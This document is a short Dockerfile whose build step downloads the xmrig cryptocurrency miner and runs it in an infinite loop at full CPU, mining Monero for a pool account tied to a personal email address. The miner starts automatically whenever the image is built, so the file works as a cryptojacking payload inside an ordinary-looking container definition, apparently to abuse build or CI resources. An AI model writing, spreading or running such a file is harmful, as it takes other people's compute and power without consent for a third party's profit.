FROM ubuntu:xenial
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.8.3/xmrig-2.8.3-xenial-amd64.tar.gz && tar -xf xmrig-2.8.3-xenial-amd64.tar.gz && cd xmrig-2.8.3 && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u philipe2018@gmail.com -p x --threads 12 --max-cpu-usage=100 --donate-level 1 ; sleep 1; done
